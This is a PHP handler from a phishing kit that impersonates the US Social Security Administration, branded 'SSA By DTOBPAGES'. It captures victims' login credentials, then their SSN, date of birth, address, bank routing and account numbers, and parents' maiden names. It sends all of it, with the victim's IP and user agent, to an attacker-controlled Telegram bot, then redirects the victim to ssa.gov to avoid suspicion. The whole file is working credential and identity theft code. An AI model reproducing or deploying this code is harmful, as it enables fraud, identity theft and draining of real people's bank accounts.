<?php
session_start();
error_reporting(0);


include "../setting.php";
$piip = $_SERVER['REMOTE_ADDR'];
$date = date('m/d/Y h:i:s a', time());
$useragent = $_SERVER['HTTP_USER_AGENT'];

if(isset($_POST['UName'])){

$u=$_POST['UName'];
$p=$_POST['PName'];



$telegram=$telesave;

$data="SESSION_START[DTOBPAGES]
===== |⫸ SSA By DTOBPAGES ⫷| =====

   # ----- 🏦 LOGIN ACCESS  ----- #

↳ 【 Username/Email   ⇢ $u
↳ 【 Password     ⇢ $p




  #  ----- FINGERPRINT  ----- #

↳ 【 IP  ⇢ $piip
↳ 【 SESSION DATE ⇢ $date
↳ 【 USER AGENT ⇢ $useragent

===== |⫸ SSA By DTOBPAGES ⫷| =====

Copyright © 2023 DTOBPAGES
JOIN CHANNEL: @dtobpages
#################################
";
$txt=$data;

if($telegram=='Yessir'){
$send=['chat_id'=>$chat_id,'text'=>$txt];
$website="https://api.telegram.org/bot$bot_url";
$ch=curl_init($website.'/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result=curl_exec($ch);
curl_close($ch);
}

header("location:i-f.php");
}
else if(isset($_POST['FName'])){
    $fname=$_POST['FName'];
    $dop=$_POST['DOP'];
    $dob=$_POST['DOB'];
    $ssn=$_POST['SSNName'];
    $addy=$_POST['StName'];
    $city=$_POST['CName'];
    $state=$_POST['SName'];
    $fmn=$_POST['FMN'];
    $tel=$_POST['Tel'];
    $mmn=$_POST['MMN'];
    $accn=$_POST['ACCN'];
    $roun=$_POST['ROUN'];
    $rsp=$_POST['DYU'];
    $amr=$_POST['AMR'];
    
    
    
    
    
    $telegram=$telesave;
    
    $data="
       # ----- 🏦 INFO ACCESS ----- #
    
       ↳ 【 First And Last Name ⇢ $fname
       ↳ 【 DOB ⇢ $dob
       ↳ 【 SSN ⇢ $ssn
       ↳ 【 Street Address ⇢ $addy
       ↳ 【 City ⇢ $city
       ↳ 【 State ⇢ $state
       ↳ 【 Amount Received ⇢ $amr
       ↳ 【 ROUN ⇢ $roun
       ↳ 【 ACCN ⇢ $accn
       ↳ 【 Phone Number ⇢ $tel
       ↳ 【 FMN ⇢ $fmn
       ↳ 【 MMN ⇢ $mmn
       ↳ 【 Received SSA ⇢ $rsp
       ↳ 【 DOP ⇢ $dop
     
    
    
      #  ----- FINGERPRINT  ----- #
    
    ↳ 【 IP  ⇢ $piip
    ↳ 【 SESSION DATE ⇢ $date
    ↳ 【 USER AGENT ⇢ $useragent
    
    ===== |⫸ SSA By DTOBPAGES ⫷| =====
    
    Copyright © 2023 DTOBPAGES
    JOIN CHANNEL: @dtobpages
    #################################
    ";
    $txt=$data;
    
    if($telegram=='Yessir'){
    $send=['chat_id'=>$chat_id,'text'=>$txt];
    $website="https://api.telegram.org/bot$bot_url";
    $ch=curl_init($website.'/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result=curl_exec($ch);
    curl_close($ch);
    }
    
    header("location:https://ssa.gov");
}


/*
 ,'|"\   _______  .---.  ,---.     ,---.    .--.    ,--,   ,---.     .---. 
 | |\ \ |__   __|/ .-. ) | .-.\    | .-.\  / /\ \ .' .'    | .-'    ( .-._)
 | | \ \  )| |   | | |(_)| |-' \   | |-' )/ /__\ \|  |  __ | `-.   (_) \   
 | |  \ \(_) |   | | | | | |--. \  | |--' |  __  |\  \ ( _)| .-'   _  \ \  
 /(|`-' /  | |   \ `-' / | |`-' /  | |    | |  |)| \  `-) )|  `--.( `-'  ) 
(__)`--'   `-'    )---'  /( `--'   /(     |_|  (_) )\____/ /( __.' `----'  
                 (_)    (__)      (__)            (__)    (__)             
                 CONTACT ON TELEGRAM @dtobpages
                 
*/
?>